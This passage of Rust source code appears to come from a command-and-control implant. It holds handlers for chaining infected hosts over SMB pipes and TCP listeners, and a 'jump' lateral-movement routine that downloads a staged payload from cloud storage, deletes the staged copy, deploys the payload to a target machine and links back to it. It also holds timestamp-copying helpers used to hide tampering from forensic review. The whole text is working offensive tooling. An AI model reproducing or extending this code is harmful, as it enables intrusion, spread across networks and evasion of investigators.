    match crate::p2p::link::link_as_parent(transport, P2P_REGISTRY.my_guid, LinkType::Smb) {
        Ok(link) => {
            let guid_hex = hex::encode(&link.guid);
            let address = link.address.clone();
            P2P_REGISTRY.add_child(link);
            format!("OK: Linked to {} via SMB (child GUID: {})", address, guid_hex)
        }
        Err(e) => format!("ERROR: Link handshake failed: {}", e),
    }
}

fn cmd_p2p_unlink(guid_hex: &str) -> String {
    let bytes = match hex::decode(guid_hex) {
        Ok(b) if b.len() == 16 => {
            let mut g = [0u8; 16];
            g.copy_from_slice(&b);
            g
        }
        _ => return format!("ERROR: Invalid GUID: {}", guid_hex),
    };
    match P2P_REGISTRY.remove_child(&bytes) {
        Some(link) => {
            link.transport.close();
            format!("OK: Unlinked child {}", guid_hex)
        }
        None => format!("ERROR: No child with GUID {}", guid_hex),
    }
}

fn cmd_p2p_status() -> String {
    use crate::protocol::P2PStatusInfo;
    use crate::protocol::P2PLinkInfo;

    let parent_info = {
        let parent = P2P_REGISTRY.parent.lock().unwrap();
        parent.as_ref().map(|p| P2PLinkInfo {
            guid:      hex::encode(&p.guid),
            link_type: p.link_type.to_string(),
            address:   p.address.clone(),
            alive:     p.is_alive(),
        })
    };

    let children_info: Vec<P2PLinkInfo> = {
        let children = P2P_REGISTRY.children.lock().unwrap();
        children.values().map(|c| P2PLinkInfo {
            guid:      hex::encode(&c.guid),
            link_type: c.link_type.to_string(),
            address:   c.address.clone(),
            alive:     c.is_alive(),
        }).collect()
    };

    let status = P2PStatusInfo {
        my_guid:  hex::encode(&P2P_REGISTRY.my_guid),
        parent:   parent_info,
        children: children_info,
    };

    serde_json::to_string_pretty(&status).unwrap_or_else(|_| "ERROR: serialize".to_string())
}

fn cmd_p2p_listener_start_tcp(addr: &str) -> String {
    match TCP_LISTENER_MGR.start(addr) {
        Ok(listener) => {
            let actual = listener.local_addr()
                .map(|a| a.to_string())
                .unwrap_or_else(|_| addr.to_string());
            // Spawn accept loop in background thread
            let registry = P2P_REGISTRY.clone();
            let listener_clone = listener.clone();
            std::thread::spawn(move || {
                while listener_clone.is_alive() {
                    match listener_clone.accept() {
                        Ok(stream_transport) => {
                            let arc_t: std::sync::Arc<dyn crate::p2p::P2PTransport> =
                                std::sync::Arc::new(stream_transport);
                            let my_guid = registry.my_guid;
                            match crate::p2p::link::link_as_parent(arc_t, my_guid, LinkType::Tcp) {
                                Ok(link) => {
                                    registry.add_child(link);
                                }
                                Err(_) => {}
                            }
                        }
                        Err(_) => break,
                    }
                }
            });
            format!("OK: TCP P2P listener started on {}", actual)
        }
        Err(e) => format!("ERROR: TCP listen on {} failed: {}", addr, e),
    }
}

fn cmd_p2p_listener_stop(addr: &str) -> String {
    if addr.is_empty() {
        TCP_LISTENER_MGR.stop_all();
        "OK: All P2P listeners stopped".to_string()
    } else if TCP_LISTENER_MGR.stop(addr) {
        format!("OK: P2P listener on {} stopped", addr)
    } else {
        format!("ERROR: No P2P listener on {}", addr)
    }
}

// ── JUMP (lateral movement) ──────────────────────────────────────────────────

fn cmd_jump(task: &Task, state: &Arc<AgentState>, transport: &SharedTransport,
            session_key: &[u8; 32]) -> TaskResponse {
    use crate::p2p::jump::{self, JumpParams, JumpResult};
    use std::time::Duration;

    let params = JumpParams::from_args(&task.args);

    if params.target.is_empty() {
        return TaskResponse::err(task, "ERROR: jump target is required".into());
    }
    if params.staging_path.is_empty() {
        return TaskResponse::err(task, "ERROR: staging_path is required".into());
    }

    crate::dlog!("jump", "module={} target={} link={} bind={}",
                 params.module, params.target, params.link_type, params.bind_addr);

    // Download the staged P2P child binary from cloud
    let payload = match transport.download(&params.staging_path) {
        Some(data) if !data.is_empty() => data,
        Some(_) => return TaskResponse::err(task, "ERROR: staged payload is empty".into()),
        None    => return TaskResponse::err(task, "ERROR: failed to download staged payload".into()),
    };

    crate::dlog!("jump", "downloaded payload: {} bytes", payload.len());

    // Clean up the staged file from cloud
    transport.delete(&params.staging_path);

    // Execute the jump module to deploy the child on the target
    let jump_result = jump::dispatch(&params, &payload);

    match jump_result {
        JumpResult::Failed { error } => {
            TaskResponse::err(task, format!("ERROR: jump {} failed: {}", params.module, error))
        }
        JumpResult::Success { remote_path } => {
            crate::dlog!("jump", "deployed to {} — waiting for child listener", remote_path);

            // Wait for the child agent to start its P2P listener
            std::thread::sleep(Duration::from_secs(3));

            // Auto-link to the child (synchronous — blocks until linked or timeout)
            let link_result = if params.link_type == "smb" {
                let pipe = params.bind_addr
                    .rsplit('\\').next()
                    .unwrap_or("stratum");
                cmd_p2p_link_smb(&params.target, pipe)
            } else {
                let addr = if params.bind_addr.starts_with("0.0.0.0:") {
                    let port = params.bind_addr.split(':').last().unwrap_or("4444");
                    format!("{}:{}", params.target, port)
                } else {
                    params.bind_addr.clone()
                };
                cmd_p2p_link_tcp(&addr, &task.id)
            };

            TaskResponse::ok(task, format!(
                "jump {} → {} deployed\nDeployed: {}\nLink: {}",
                params.module, params.target, remote_path, link_result
            ))
        }
    }
}

// ── timestamp helpers ─────────────────────────────────────────────────────────

#[cfg(unix)]
fn copy_timestamps(target: &str, reference: &str) -> Result<String, String> {
    use std::os::unix::fs::MetadataExt;
    let meta  = std::fs::metadata(reference).map_err(|e| e.to_string())?;
    let mtime = filetime::FileTime::from_unix_time(meta.mtime(), meta.mtime_nsec() as u32);
    let atime = filetime::FileTime::from_unix_time(meta.atime(), meta.atime_nsec() as u32);
    filetime::set_file_times(target, atime, mtime).map_err(|e| e.to_string())?;
    Ok(format!("{}", meta.mtime()))
}

#[cfg(windows)]
fn copy_timestamps(target: &str, reference: &str) -> Result<String, String> {
    let ref_meta = std::fs::metadata(reference).map_err(|e| e.to_string())?;
    let mtime    = filetime::FileTime::from_last_modification_time(&ref_meta);
    let atime    = filetime::FileTime::from_last_access_time(&ref_meta);
    filetime::set_file_times(target, atime, mtime).map_err(|e| e.to_string())?;
    Ok(format!("{}", mtime.unix_seconds()))
}

#[cfg(unix)]
fn set_timestamp(target: &str, datetime: &str) -> Result<(), String> {
    let status = std::process::Command::new("touch")
        .args(["-d", datetime, target])
        .status()
        .map_err(|e| e.to_string())?;
    if status.success() { Ok(()) } else { Err("touch -d failed".to_string()) }
}

#[cfg(windows)]
fn set_timestamp(target: &str, datetime: &str) -> Result<(), String> {
    use chrono::DateTime;
    let dt = DateTime::parse_from_rfc3339(datetime)
        .or_else(|_| DateTime::parse_from_str(datetime, "%Y-%m-%d %H:%M:%S %z"))
        .map_err(|e| format!("parse date '{}': {}", datetime, e))?;
    let ft = filetime::FileTime::from_unix_time(dt.timestamp(), 0);
    filetime::set_file_times(target, ft, ft).map_err(|e| e.to_string())
}
